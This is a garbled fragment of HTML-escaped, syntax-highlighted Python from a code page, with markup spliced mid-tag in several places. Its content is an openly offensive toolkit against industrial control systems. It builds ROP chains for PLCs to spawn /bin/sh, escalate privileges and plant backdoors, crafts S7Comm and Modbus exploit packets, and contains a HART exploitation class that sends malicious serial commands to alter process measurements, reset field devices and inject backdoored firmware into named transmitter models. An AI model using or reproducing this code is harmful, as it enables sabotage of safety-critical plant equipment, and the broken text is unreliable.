\"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003erop_chain\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e []\n        \n        \u003cspan class=\"pl-k\"\u003eif\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003earchitecture\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e==\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e'x86'\u003c/span\u003e:\n            \u003cspan class=\"pl-s1\"\u003egadgets\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e {\n                \u003cspan class=\"pl-s\"\u003e'pop_eax'\u003c/span\u003e: \u003cspan class=\"pl-c1\"\u003e0x08001234\u003c/span\u003e,\n                \u003cspan class=\"pl-s\"\u003e'pop_ebx'\u003c/span\u003e: \u003cspan class=\"pl-c1\"\u003e0x08001238\u003c/span\u003e,\n                \u003cspan class=\"pl-s\"\u003e'pop_ecx'\u003c/span\u003e: \u003cspan class=\"pl-c1\"\u003e0x0800123C\u003c/span\u003e,\n                \u003cspan class=\"pl-s\"\u003e'pop_edx'\u003c/span\u003e: \u003cspan class=\"pl-c1\"\u003e0x08001240\u003c/span\u003e,\n                \u003cspan class=\"pl-s\"\u003e'syscall'\u003c/span\u003e: \u003cspan class=\"pl-c1\"\u003e0x08001244\u003c/span\u003e,\n                \u003cspan class=\"pl-s\"\u003e'execute_command'\u003c/span\u003e: \u003cspan class=\"pl-c1\"\u003e0x08001250\u003c/span\u003e,\n            }\n            \n            \u003cspan class=\"pl-c\"\u003e# ROP chain to execute system command or shellcode\u003c/span\u003e\n            \u003cspan class=\"pl-s1\"\u003erop_chain\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eextend\u003c/span\u003e([\n                \u003cspan class=\"pl-c\"\u003e# Execute system command (example: start reverse shell)\u003c/span\u003e\n                \u003cspan class=\"pl-s1\"\u003egadgets\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'pop_eax'\u003c/span\u003e], \u003cspan class=\"pl-c1\"\u003e0x0B\u003c/span\u003e,           \u003cspan class=\"pl-c\"\u003e# execve syscall number\u003c/span\u003e\n                \u003cspan class=\"pl-s1\"\u003egadgets\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'pop_ebx'\u003c/span\u003e], \u003cspan class=\"pl-c1\"\u003e0x0800B000\u003c/span\u003e,     \u003cspan class=\"pl-c\"\u003e# Pointer to \"/bin/sh\"\u003c/span\u003e\n                \u003cspan class=\"pl-s1\"\u003egadgets\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'pop_ecx'\u003c/span\u003e], \u003cspan class=\"pl-c1\"\u003e0x0800B010\u003c/span\u003e,     \u003cspan class=\"pl-c\"\u003e# Pointer to argv\u003c/span\u003e\n                \u003cspan class=\"pl-s1\"\u003egadgets\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'pop_edx'\u003c/span\u003e], \u003cspan class=\"pl-c1\"\u003e0x0800B020\u003c/span\u003e,     \u003cspan class=\"pl-c\"\u003e# Pointer to envp\u003c/span\u003e\n                \u003cspan class=\"pl-s1\"\u003egadgets\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'syscall'\u003c/span\u003e],                 \u003cspan class=\"pl-c\"\u003e# Execute command\u003c/span\u003e\n            ])\n            \n        \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003erop_chain\u003c/span\u003e\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003eprivilege_escalation_rop\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Build ROP chain for PLC privilege escalation attacks.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Elevates permissions from user to system/administrator level.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        \"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003erop_chain\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e []\n        \n        \u003cspan class=\"pl-k\"\u003eif\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003earchitecture\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e==\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e'x86'\u003c/span\u003e:\n            \u003cspan class=\"pl-s1\"\u003egadgets\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e {\n                \u003cspan class=\"pl-s\"\u003e'pop_eax'\u003c/span\u003e: \u003cspan class=\"pl-c1\"\u003e0x08001234\u003c/span\u003e,\n                \u003cspan class=\"pl-s\"\u003e'pop_ebx'\u003c/span\u003e: \u003cspan class=\"pl-c1\"\u003e0x08001238\u003c/span\u003e,\n                \u003cspan class=\"pl-s\"\u003e'syscall'\u003c/span\u003e: \u003cspan class=\"pl-c1\"\u003e0x08001244\u003c/span\u003e,\n                \u003cspan class=\"pl-s\"\u003e'set_privileges'\u003c/span\u003e: \u003cspan class=\"pl-c1\"\u003e0x08001260\u003c/span\u003e,\n            }\n            \n            \u003cspan class=\"pl-c\"\u003e# ROP chain to escalate privileges\u003c/span\u003e\n            \u003cspan class=\"pl-s1\"\u003erop_chain\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eextend\u003c/span\u003e([\n                \u003cspan class=\"pl-c\"\u003e# Call set_privileges function with elevated permissions\u003c/span\u003e\n                \u003cspan class=\"pl-s1\"\u003egadgets\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'pop_eax'\u003c/span\u003e], \u003cspan class=\"pl-c1\"\u003e0x08001260\u003c/span\u003e,     \u003cspan class=\"pl-c\"\u003e# set_privileges function\u003c/span\u003e\n                \u003cspan class=\"pl-s1\"\u003egadgets\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'pop_ebx'\u003c/span\u003e], \u003cspan class=\"pl-c1\"\u003e0x00000000\u003c/span\u003e,     \u003cspan class=\"pl-c\"\u003e# Root privileges flag\u003c/span\u003e\n                \u003cspan class=\"pl-s1\"\u003egadgets\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'syscall'\u003c/span\u003e],                 \u003cspan class=\"pl-c\"\u003e# Execute privilege escalation\u003c/span\u003e\n            ])\n            \n        \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003erop_chain\u003c/span\u003e\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003epersistent_access_rop\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Build ROP chain for persistent backdoor installation on PLC.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e class=\"pl-s1\"\u003erop_chain\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e []\n        \n        \u003cspan class=\"pl-k\"\u003eif\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e'pop_eax'\u003c/span\u003e: \u003cspan class=\"pl-c1\"\u003e0x08001234\u003c/span\u003e,\n                \u003cspan class=\"pl-s\"\u003e'pop_ebx'\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e'write_file'\u003c/span\u003e: \u003cspan class=\"pl-c1\"\u003e0x08001270\u003c/span\u003e,\n            }\n            \n            \u003cspan class=\"pl-c\"\u003e# ROP chain to \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003ecraft_exploit_packet\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003erop_chain\u003c/span\u003e:\n            \u003cspan class=\"pl-s1\"\u003erop_bytes\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e+=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003ebyteorder\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e'little'\u003c/span\u003e)\n        \n        \u003cspan class=\"pl-c\"\u003e# Build protocol-specific exploit packet\u003c/span\u003e\n        \u003cspan class=\"pl-k\"\u003eif\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003evulnerability\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'protocol'\u003c/span\u003e] \u003cspan class=\"pl-c1\"\u003e==\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e's7comm'\u003c/span\u003e:\n            \u003cspan class=\"pl-c\"\u003e# Siemens S7Comm exploit packet format\u003c/span\u003e\n            \u003cspan class=\"pl-s1\"\u003eexploit_packet\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ebuild_s7comm_exploit\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003erop_bytes\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003evulnerability\u003c/span\u003e)\n        \u003cspan class=\"pl-k\"\u003eelif\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003evulnerability\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'protocol'\u003c/span\u003e] \u003cspan class=\"pl-c1\"\u003e==\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e'modbus'\u003c/span\u003e:\n            \u003cspan class=\"pl-c\"\u003e# Modbus TCP exploit packet format  \u003c/span\u003e\n            \u003cspan class=\"pl-s1\"\u003eexploit_packet\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan \u003cspan class=\"pl-k\"\u003eelse\u003c/span\u003e:\n            \u003cspan class=\"pl-c\"\u003e# Generic TCP exploit packet\u003c/span\u003e\n            \u003cspan class=\"pl-s1\"\u003eexploit_packet\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ebuild_generic_exploit\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003erop_bytes\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003evulnerability\u003c/span\u003e)\n        \n        \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eexploit_packet\u003c/span\u003e\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003everify_exploit_success\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003eresponse\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Verify ROP exploit success based on PLC response.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Analyzes response for signs of successful code execution.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        \"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-k\"\u003eif\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003enot\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eresponse\u003c/span\u003e:\n            \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eFalse\u003c/span\u003e\n        \n        \u003cspan class=\"pl-c\"\u003e# Check for expected response patterns\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003esuccess_indicators\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e [\n            \u003cspan class=\"pl-s\"\u003eb'success'\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003eb'executed'\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003eb'completed'\u003c/span\u003e,\n            \u003cspan class=\"pl-s\"\u003eb'\u003cspan class=\"pl-cce\"\u003e\\x90\u003c/span\u003e'\u003c/span\u003e,  \u003cspan class=\"pl-c\"\u003e# NOP sled in response\u003c/span\u003e\n            \u003cspan class=\"pl-s\"\u003eb'\u003cspan class=\"pl-cce\"\u003e\\xcc\u003c/span\u003e\u003cspan class=\"pl-cce\"\u003e\\xcc\u003c/span\u003e\u003cspan class=\"pl-cce\"\u003e\\xcc\u003c/span\u003e\u003cspan class=\"pl-cce\"\u003e\\xcc\u003c/span\u003e'\u003c/span\u003e   \u003cspan class=\"pl-c\"\u003e# Breakpoint instructions\u003c/span\u003e\n        ]\n        \n        \u003cspan class=\"pl-k\"\u003efor\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eindicator\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003ein\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003esuccess_indicators\u003c/span\u003e:\n            \u003cspan class=\"pl-k\"\u003eif\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eindicator\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003ein\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eresponse\u003c/span\u003e:\n                \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eTrue\u003c/span\u003e\n        \n        \u003cspan class=\"pl-c\"\u003e# Check for absence of error indicators\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003eerror_indicators\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e [\u003cspan class=\"pl-s\"\u003eb'error'\u003c/span\u003e, \u003cspan class=\"pl-k\"\u003efor\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eindicator\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003ein\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eerror_indicators\u003c/span\u003e:\n            \u003cspan class=\"pl-k\"\u003eif\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eindicator\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eFalse\u003c/span\u003e\n        \n        \u003cspan class=\"pl-c\"\u003e# Default to success if we get any response (for demonstration)\u003c/span\u003e\n        \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-en\"\u003elen\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eresponse\u003c/span\u003e) \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003erop_bytes\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003evulnerability\u003c/span\u003e):\n        \u003cspan chain\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003es7_header\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s\"\u003eb'\u003cspan data-snippet-clipboard-copy-content=\"class HARTExploitation:\n    def __init__(self, interface='usb'):\n        \u0026quot;\u0026quot;\u0026quot;\n        CRITICAL PROCESS INSTRUMENTATION SECURITY NOTICE: This class demonstrates HART\n        protocol exploitation for authorized industrial instrumentation security testing ONLY.\n        \n        AUTHORIZED USE CASES:\n        - HART device security assessment in isolated test environments\n        - Process instrumentation cybersecurity research\n        - Red team exercises with proper authorization and oversight\n        - Defensive monitoring and detection system development\n        \n        STRICT PROHIBITIONS:\n        - NEVER use on operational process instrumentation\n        - Do not interfere with safety-critical measurement devices\n        - Avoid disruption of process monitoring and control systems\n        - Comply with all industrial safety and operational standards\n        \n        INDUSTRY STANDARDS COMPLIANCE:\n        - HART Communication Protocol (HCF SPEC-13)\n        - IEC 61158 (Industrial Communication Networks)\n        - NAMUR NE 107 (Process Instrumentation Diagnostics)\n        - NIST SP 800-82 (Industrial Control System Security)\n        \u0026quot;\u0026quot;\u0026quot;\n        self.interface = interface\n        self.hart_commands = self.load_hart_command_set()\n        self.device_profiles = self.load_hart_device_profiles()\n\n    def exploit_hart_device(self, target_device):\n        \u0026quot;\u0026quot;\u0026quot;\n        Execute comprehensive HART device exploitation across multiple attack vectors.\n        Combines command injection, memory manipulation, and firmware attacks for complete device compromise.\n        \u0026quot;\u0026quot;\u0026quot;\n        exploitation_results = {}\n        \n        # Phase 1: HART Command Injection\n        exploitation_results['command_injection'] = self.hart_command_injection(target_device)\n        \n        # Phase 2: Memory Manipulation and Exploitation\n        exploitation_results['memory_exploitation'] = self.hart_memory_exploitation(target_device)\n        \n        # Phase 3: Firmware Analysis and Manipulation\n        exploitation_results['firmware_exploitation'] = self.hart_firmware_exploitation(target_device)\n        \n        # Phase 4: Device Configuration Tampering\n        exploitation_results['configuration_tampering'] = self.hart_configuration_tampering(target_device)\n        \n        return exploitation_results\n\n    def hart_command_injection(self, device):\n        \u0026quot;\u0026quot;\u0026quot;\n        Execute HART command injection attacks to manipulate device behavior.\n        Uses legitimate HART commands with malicious parameters for device control.\n        \u0026quot;\u0026quot;\u0026quot;\n        import serial\n        import time\n        \n        # Initialize HART modem interface (1200 baud FSK)\n        ser = serial.Serial(self.interface, 1200, bytesize=7, parity='E', stopbits=1, timeout=2)\n        \n        # HART command frame structure (HCF SPEC-13):\n        # Byte 0: Delimiter (0x82 = long frame with 2 expansion bytes)\n        # Byte 1: Command code\n        # Following bytes: Command data\n        malicious_commands = [\n            # Command 6: Write Primary Variable - Manipulate process measurement\n            b'\\x82\\x06\\x00\\x00\\x00\\x00\\x00\\x00',\n            \n            # Command 7: Write Device Variables - Overwrite critical configuration\n            b'\\x82\\x07\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF',\n            \n            # Command 48 (0x30): Reset Device - Factory reset disruption\n            b'\\x82\\x30\\x00\\x00\\x00\\x00\\x00\\x00',\n            \n            # Command 13: Write Message - Inject malicious device message\n            b'\\x82\\x0D\\x41\\x41\\x41\\x41\\x41\\x41',  # \u0026quot;AAAAAA\u0026quot; message\n            \n            # Command 15: Write Tag - Change device identification\n            b'\\x82\\x0F\\x48\\x41\\x43\\x4B\\x45\\x44',  # \u0026quot;HACKED\u0026quot; tag\n            \n            # Command 16: Write Descriptor - Modify device description\n            b'\\x82\\x10\\x42\\x41\\x43\\x44\\x4F\\x4F',  # \u0026quot;BACKDOOR\u0026quot; descriptor\n        ]\n        \n        injection_results = []\n        \n        for cmd in malicious_commands:\n            try:\n                # Send malicious HART command\n                ser.write(cmd)\n                time.sleep(0.1)  # HART response delay\n                \n                # Read device response\n                response = ser.read(64)\n                \n                # Verify command success and analyze response\n                command_success = self.verify_command_success(response)\n                injection_results.append({\n                    'command': cmd.hex(),\n                    'command_description': self.decode_hart_command(cmd),\n                    'response_received': len(response) \u0026gt; 0,\n                    'command_success': command_success,\n                    'response_data': response.hex() if response else None\n                })\n                \n                if command_success:\n                    print(f\u0026quot;[+] HART command successful: {self.decode_hart_command(cmd)}\u0026quot;)\n                else:\n                    print(f\u0026quot;[-] HART command failed: {self.decode_hart_command(cmd)}\u0026quot;)\n                    \n            except Exception as e:\n                injection_results.append({\n                    'command': cmd.hex(),\n                    'error': str(e),\n                    'success': False\n                })\n                print(f\u0026quot;[!] HART command error: {e}\u0026quot;)\n        \n        ser.close()\n        return injection_results\n\n    def hart_memory_exploitation(self, device):\n        \u0026quot;\u0026quot;\u0026quot;\n        Execute HART memory manipulation attacks for device compromise.\n        Includes memory dumping, analysis, and modification techniques.\n        \u0026quot;\u0026quot;\u0026quot;\n        memory_operations = {\n            'memory_dump': self.dump_hart_memory(device),\n            'memory_analysis': self.analyze_hart_memory(device),\n            'memory_modification': self.modify_hart_memory(device),\n            'configuration_extraction': self.extract_hart_configuration(device)\n        }\n        \n        return memory_operations\n\n    def hart_firmware_exploitation(self, device):\n        \u0026quot;\u0026quot;\u0026quot;\n        Execute comprehensive HART firmware exploitation attacks.\n        Includes firmware extraction, vulnerability analysis, and backdoor injection.\n        \u0026quot;\u0026quot;\u0026quot;\n        exploitation_results = {}\n        \n        # Phase 1: Firmware extraction through HART commands\n        firmware_data = self.dump_hart_firmware(device)\n        exploitation_results['firmware_dump'] = {\n            'success': bool(firmware_data),\n            'size': len(firmware_data) if firmware_data else 0,\n            'crc_checksum': self.calculate_crc(firmware_data) if firmware_data else None\n        }\n        \n        if firmware_data:\n            # Phase 2: Firmware vulnerability analysis\n            vulnerabilities = self.analyze_hart_firmware(firmware_data)\n            exploitation_results['vulnerability_analysis'] = vulnerabilities\n            \n            # Phase 3: Backdoor firmware creation and deployment\n            if vulnerabilities:\n                backdoored_firmware = self.inject_firmware_backdoor(firmware_data, vulnerabilities)\n                upload_success = self.upload_hart_firmware(device, backdoored_firmware)\n                \n                exploitation_results['backdoor_injection'] = {\n                    'success': upload_success,\n                    'backdoor_type': self.identify_backdoor_type(vulnerabilities),\n                    'persistence_mechanism': self.establish_persistence(device)\n                }\n        \n        return exploitation_results\n\n    def hart_configuration_tampering(self, device):\n        \u0026quot;\u0026quot;\u0026quot;\n        Execute HART device configuration tampering attacks.\n        Modifies critical device parameters for malicious control or disruption.\n        \u0026quot;\u0026quot;\u0026quot;\n        configuration_attacks = {\n            'range_manipulation': self.manipulate_measurement_range(device),\n            'calibration_tampering': self.tamper_calibration_data(device),\n            'alert_thresholds': self.modify_alert_thresholds(device),\n            'communication_settings': self.manipulate_communication_settings(device),\n            'security_settings': self.bypass_security_settings(device)\n        }\n        \n        return configuration_attacks\n\n    def load_hart_command_set(self):\n        \u0026quot;\u0026quot;\u0026quot;\n        Load comprehensive HART command set for exploitation.\n        Includes standard, common practice, and device-specific commands.\n        \n        Command structure per HART Communication Protocol Specification (HCF SPEC-13):\n        - Universal Commands (0-30): Mandatory for all HART devices\n        - Common Practice Commands (32-126): Optional but widely implemented\n        - Device-Specific Commands (128-253): Vendor/device specific\n        \u0026quot;\u0026quot;\u0026quot;\n        hart_commands = {\n            # Universal Commands (0-30) - HART Spec HCF SPEC-13\n            0: 'Read Primary Variable',\n            1: 'Read Loop Current',\n            2: 'Read Dynamic Variables',\n            3: 'Read Device Variables',\n            6: 'Write Primary Variable',\n            7: 'Write Device Variables',\n            11: 'Read Unique Identifier',\n            12: 'Read Message',\n            13: 'Write Message',\n            14: 'Read Tag',\n            15: 'Write Tag',\n            16: 'Read Descriptor',\n            17: 'Write Descriptor',\n            18: 'Read Date',\n            \n            # Common Practice Commands (32-126)\n            33: 'Read Primary Variable Transducer Info',\n            34: 'Write Primary Variable Transducer Info',\n            35: 'Read Device Information',\n            38: 'Reset Configuration Changed Flag',\n            48: 'Reset Device',\n            \n            # Device-Specific Commands (128-253)\n            128: 'Read Additional Device Status',\n            129: 'Write Device Calibration',\n            130: 'Read Firmware Version',\n            131: 'Write Firmware Update'\n        }\n        \n        return hart_commands\n\n    def verify_command_success(self, response):\n        \u0026quot;\u0026quot;\u0026quot;\n        Verify HART command success based on response data and status bytes.\n        Analyzes response frame for command completion status and error codes.\n        \u0026quot;\u0026quot;\u0026quot;\n        if not response or len(response) \u0026lt; 2:\n            return False\n        \n        # HART response format: Preamble, Delimiter, Address, Command, Byte Count, Data, Status, Checksum\n        if len(response) \u0026gt;= 5:\n            # Check response status byte (typically byte 4 or 5 depending on frame format)\n            status_byte = response[4] if len(response) \u0026gt; 4 else response[2]\n            \n            # Status byte bitmask analysis\n            communication_error = (status_byte \u0026amp; 0x80) != 0  # Bit 7: Communication error\n            device_error = (status_byte \u0026amp; 0x40) != 0         # Bit 6: Device specific error\n            configuration_changed = (status_byte \u0026amp; 0x20) != 0 # Bit 5: Configuration changed\n            \n            # Command successful if no communication or device errors\n            return not (communication_error or device_error)\n        \n        return False\n\n    def decode_hart_command(self, command_bytes):\n        \u0026quot;\u0026quot;\u0026quot;\n        Decode HART command bytes to human-readable description.\n        Provides detailed information about command purpose and parameters.\n        \u0026quot;\u0026quot;\u0026quot;\n        if len(command_bytes) \u0026gt;= 2:\n            command_number = command_bytes[1]  # Command number is second byte\n            return self.hart_commands.get(command_number, f'Unknown Command ({command_number})')\n        \n        return 'Invalid Command Format'\n\n    def dump_hart_firmware(self, device):\n        \u0026quot;\u0026quot;\u0026quot;\n        Extract firmware from HART device using extended memory read commands.\n        Uses device-specific commands to read firmware memory regions.\n        \u0026quot;\u0026quot;\u0026quot;\n        # Implementation for firmware extraction through HART commands\n        # This would involve multiple memory read operations and reassembly\n        firmware_data = b''\n        \n        # Example: Use device-specific commands for firmware extraction\n        # Actual implementation would vary by device manufacturer and model\n        \n        return firmware_data  # Placeholder for actual implementation\n\n    def analyze_hart_firmware(self, firmware_data):\n        \u0026quot;\u0026quot;\u0026quot;\n        Analyze extracted HART firmware for vulnerabilities and backdoor opportunities.\n        Includes binary analysis, string extraction, and vulnerability pattern matching.\n        \u0026quot;\u0026quot;\u0026quot;\n        vulnerabilities = []\n        \n        if firmware_data:\n            # Basic firmware analysis\n            analysis_results = {\n                'firmware_size': len(firmware_data),\n                'architecture': self.identify_architecture(firmware_data),\n                'hardware_platform': self.identify_hardware_platform(firmware_data),\n                'vulnerable_functions': self.identify_vulnerable_functions(firmware_data),\n                'backdoor_opportunities': self.identify_backdoor_opportunities(firmware_data)\n            }\n            \n            vulnerabilities.append(analysis_results)\n        \n        return vulnerabilities\n\n    def inject_firmware_backdoor(self, original_firmware, vulnerabilities):\n        \u0026quot;\u0026quot;\u0026quot;\n        Inject backdoor into HART device firmware based on vulnerability analysis.\n        Creates modified firmware with persistent access capabilities.\n        \u0026quot;\u0026quot;\u0026quot;\n        # Create backdoored firmware based on analysis\n        backdoored_firmware = original_firmware\n        \n        # Implementation would include:\n        # - Code cave identification and backdoor insertion\n        # - Function hooking for command interception\n        # - Persistent access mechanism implementation\n        # - Checksum recalculation and validation\n        \n        return backdoored_firmware\n\n    # Additional helper methods would be implemented here...\n    def load_hart_device_profiles(self):\n        \u0026quot;\u0026quot;\u0026quot;Load known HART device profiles for targeted exploitation\u0026quot;\u0026quot;\u0026quot;\n        return {\n            'pressure_transmitters': ['Rosemount 3051', 'Yokogawa EJA', 'ABB 2600T'],\n            'temperature_transmitters': ['Rosemount 3144', 'Yokogawa YTA', 'Siemens SITRANS'],\n            'flow_meters': ['Emerson Coriolis', 'Yokogawa Vortex', 'ABB Magnetic'],\n            'level_devices': ['Rosemount 3300', 'Magnetrol Eclipse', 'Vega]\n        }\n\n    def calculate_crc(self, data):\n        \u0026quot;\u0026quot;\u0026quot;Calculate CRC checksum for firmware validation\u0026quot;\u0026quot;\u0026quot;\n        if not data:\n            return None\n        # Simple placeholder CRC calculation\n        return sum(data) \u0026amp; 0xFFFF\n\n    def identify_backdoor_type(self, vulnerabilities):\n        \u0026quot;\u0026quot;\u0026quot;Identify appropriate backdoor type based on vulnerability analysis\u0026quot;\u0026quot;\u0026quot;\n        return \u0026quot;Command Interception Backdoor\u0026quot;\n        ```\"\u003e\u003cpre\u003e\u003cspan class=\"pl-k\"\u003eclass\u003c/span\u003e \u003cspan class=\"pl-v\"\u003eHARTExploitation\u003c/span\u003e:\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003e__init__\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003einterface\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e'usb'\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        CRITICAL PROCESS INSTRUMENTATION SECURITY NOTICE: This class demonstrates HART\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        protocol exploitation for authorized industrial instrumentation security testing ONLY.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        \u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        AUTHORIZED USE CASES:\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        - HART device security assessment in isolated test environments\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        - Process instrumentation cybersecurity research\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        - Red team exercises with proper authorization and oversight\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        - Defensive monitoring and detection system development\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        \u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        STRICT PROHIBITIONS:\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        - NEVER use on operational process instrumentation\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        - Do not interfere with safety-critical measurement devices\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        - Avoid disruption of process monitoring and control systems\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        - Comply with all industrial safety and operational standards\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        \u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        INDUSTRY STANDARDS COMPLIANCE:\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        - HART Communication Protocol (HCF SPEC-13)\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        - IEC 61158 (Industrial Communication Networks)\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        - NAMUR NE 107 (Process Instrumentation Diagnostics)\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        - NIST SP 800-82 (Industrial Control System Security)\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        \"\"\"\u003c/span\u003e\n        \u003cspan 